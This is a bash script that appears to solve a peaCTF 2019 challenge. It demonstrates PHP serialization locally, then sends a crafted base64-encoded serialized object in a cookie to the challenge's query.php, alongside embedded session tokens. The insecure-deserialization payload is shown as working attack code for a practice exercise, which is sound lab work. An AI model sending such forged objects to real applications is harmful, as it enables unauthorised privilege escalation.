#!/bin/bash

php="$(cat << 'EOM'
$a=(function(){
    class User{public function is_admin(){return true;}}
    $r=new User;
    return $r;
})();
var_dump($a);
var_dump($a->is_admin());
$b=serialize($a);
var_dump($b);

$inp='O:4:"User":0:{}';
$c=unserialize($inp);
var_dump($c);
var_dump($c->is_admin());
EOM
)"
php -r "$php"

user="$(cat <<EOM
$(echo 'O:5:"Users":0:{}'|base64)
EOM
)"
curl -v 'http://shell1.2019.peactf.com:22541/query.php' \
    -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' \
    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
    -H 'Accept-Language: en-US,en;q=0.7,ja;q=0.3' \
    --compressed \
    -H 'DNT: 1' \
    -H 'Connection: keep-alive' \
    -H "Cookie: __cfduid=d119fb490779bf74814ec9a2d930a56941561792700; token=d3455fdfcae740ba987d420834377f5a; flask=.eJwNyjEOgzAMAMC_eGYwsVM7fAa5sSNViLRCYUL8nd58F6y_OHbr0Qcs4zhjgvHdosMCTpxz81YthPFtRcU5oRKTSMsGE5wf_8cXGnvlWmZPTMjaeI6azKWQKiHcD3wHHcU.XTUxLQ.BvhXxoHmh2Znczz229T2Qua174I; user=${user}" \
    -H 'Upgrade-Insecure-Requests: 1' \
    -H 'Cache-Control: max-age=0'


